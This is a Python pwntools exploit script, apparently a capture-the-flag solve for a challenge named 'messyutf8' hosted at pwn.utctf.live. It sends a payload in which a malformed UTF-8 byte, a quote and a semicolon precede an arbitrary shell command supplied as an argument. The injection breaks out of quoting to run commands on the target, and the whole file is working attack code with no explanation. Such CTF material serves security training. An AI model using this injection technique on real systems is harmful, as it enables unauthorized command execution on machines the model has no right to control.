#!/usr/bin/python3

from pwn import *
from sys import argv

cmd = argv[1]

context.terminal = 'tmux split -h'.split(' ')

exe = ELF('messyutf8')

if args.REMOTE:
    p = remote('pwn.utctf.live', 5434)
else:
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, '''
            break * 0x400823
            continue
            ''')

one = bytes([6 << 5])
two = bytes([0xe << 4])
three = bytes([0x1e << 3])

payload = three + b'\'; ' + cmd.encode()
p.sendline(payload)

p.interactive()
